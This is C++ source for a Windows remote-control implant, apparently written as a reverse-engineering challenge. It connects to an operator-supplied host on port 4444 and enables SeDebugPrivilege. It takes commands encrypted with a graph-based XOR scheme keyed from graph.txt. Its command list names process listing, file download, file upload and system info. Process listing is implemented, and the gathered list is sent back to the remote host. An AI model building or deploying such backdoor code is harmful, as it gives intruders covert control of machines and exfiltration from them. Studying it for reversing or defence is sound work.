#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <stack>
#include <queue>
#include <iostream>
#include <fstream>
#include <string>

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4444"
#define MAX_PROCS 1024

typedef std::vector<int> vi;

char *commands[5] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet"};
char recvbuf[DEFAULT_BUFLEN];
SOCKET ourSock;
bool visited[DEFAULT_BUFLEN];
int maxDepth = 0;
char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
char *KeyFile = "graph.txt";
std::string dataToSend;
int idx = 0;
std::vector<vi> G;

void WeInitGraph() {
	std::ifstream inp(KeyFile);
	std::string line;
	while (std::getline(inp, line)) {
		vi gu = vi();
		for (unsigned int i = 0; i < line.length(); i++) {
			if (line[i] == '1') {
				gu.push_back(i);
			}
		}
		G.push_back(gu);
	}
}

void WeDFS(int u, char *data, int stop) {
	if (idx + 1 >= stop) {
		return;
	}

	if (visited[u]) {
		return;
	}

	idx += 1;
	data[idx] ^= NotKey[u % strlen(NotKey)];
	visited[u] = true;
	for (unsigned int i = 0; i < G[u].size(); i++) {
		int v = G[u][i];
		if (visited[v]) {
			continue;
		}
		
		WeDFS(v, data, stop);
	}
}

void WeEncryptOrWeDecrypt(char *data, int length) {
	int nBytesProcessed = 0;
	char *ptr = data;
	while (nBytesProcessed < length) {
		memset(visited, 0, sizeof(visited));
		idx = -1;
		WeDFS(0, ptr, length - nBytesProcessed);
		if (idx == -1) {
			puts("\nDone DEncrypting");
		} else {
			ptr += idx + 1;
			nBytesProcessed += idx + 1;
		}
	}
	puts("\nDone DEncrypting");
}

int WeSendData(std::string data, SOCKET sock) {
	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
	printf("Data length: %d\n", data.length());
	char *cdata = (char *)malloc(allocLen);
	memcpy(cdata, data.c_str(), data.length());
	cdata[data.length()] = 0;
	WeEncryptOrWeDecrypt(cdata, data.length());
	send(sock, "yeeted", strlen("yeeted"), 0);
	int iResult = send(sock, cdata, data.length(), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %x\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}
	memset(cdata, 0, allocLen);
	strcpy(cdata, "yeeted");
	send(sock, cdata, allocLen, 0);
	free(cdata);
	return iResult;
}

int WeRecvData(char *&cdata, SOCKET sock) {
	std::string yeet = "";
	bool isYeeted = false;

	while (true) {
		memset(recvbuf, 0, sizeof(recvbuf));
		int iResult = recv(ourSock, recvbuf, DEFAULT_BUFLEN - 1, 0);

		if (iResult > 0) {
			yeet += std::string(recvbuf, iResult);
			int yeetidx = yeet.find("yeeted");
			if (yeetidx != -1) {
				if (isYeeted)  {
					yeet.erase(yeetidx);
					break;
				}
				else {
					yeet.erase(0, yeetidx + strlen("yeeted"));
					isYeeted = true;
				}
			}
		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else  {
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ourSock);
			WSACleanup();
			exit(1);
		}
	}

	printf("Yeet length: %d\n", yeet.length());
	cdata = (char *)malloc(yeet.length() + 1);
	memcpy(cdata, yeet.c_str(), yeet.length());
	WeEncryptOrWeDecrypt(cdata, yeet.length());
	cdata[yeet.length()] = 0;
}

int WeInitSocket(char *ipaddr, SOCKET *sock) {
	WSADATA wsaData;
	struct addrinfo *result = NULL, hints;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %x\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ipaddr, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %x\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %x\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	char *sndbuf = "\0\0\0\0";
	setsockopt(ConnectSocket, SOL_SOCKET, SO_SNDBUF, sndbuf, 4);

	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	*sock = ConnectSocket;
	return 0;
}

int WeShutdownSocket(SOCKET sock) {
	closesocket(sock);
	WSACleanup();
	return 0;
}

void WeGetOneProcess(DWORD processID) {
	char szProcessName[MAX_PATH] = "<unknown>";
	char data[DEFAULT_BUFLEN];
	
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	memset(data, 0, sizeof(data));

	if (NULL != hProcess) {
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			if (!GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
				printf("GetModuleBaseName failed: %x\n", GetLastError());
			}
		}
		else {
			printf("EnumProcessModules failed: %x\n", GetLastError());
		}
	}
	else {
		printf("OpenProcess failed: %x\n", GetLastError());
	}
	
	sprintf_s(data, "%s  (PID: %u)\n", szProcessName, processID);
	dataToSend += std::string(data);
	CloseHandle(hProcess);
}

void WeGetPriv() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug)) {
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, NULL, NULL)) {
				printf("AdjustTokenPrivileges failed: %x\n", GetLastError());
			}
		}
	}
}

int WeGetProcesses(void) {
	dataToSend = "";
	DWORD aProcesses[MAX_PROCS], cbNeeded, cProcesses;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		printf("EnumProcesses failed: %x\n", GetLastError());
		return 1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for (unsigned int i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			WeGetOneProcess(aProcesses[i]);
		}
	}
	
	WeSendData(dataToSend, ourSock);
	return 0;
}

int main(int argc, char **argv) {

	WeInitGraph();
	WeInitSocket(argv[1], &ourSock);
	WeGetPriv();

	while (true) {
		char *cmd;
		WeRecvData(cmd, ourSock);
		puts(cmd);
		if (!strncmp(cmd, commands[0], strlen(commands[0]))) {
			WeGetProcesses();
		} else {
			printf("yeet!\n");
			WeSendData(std::string("yeeted"), ourSock);
		}
	}
}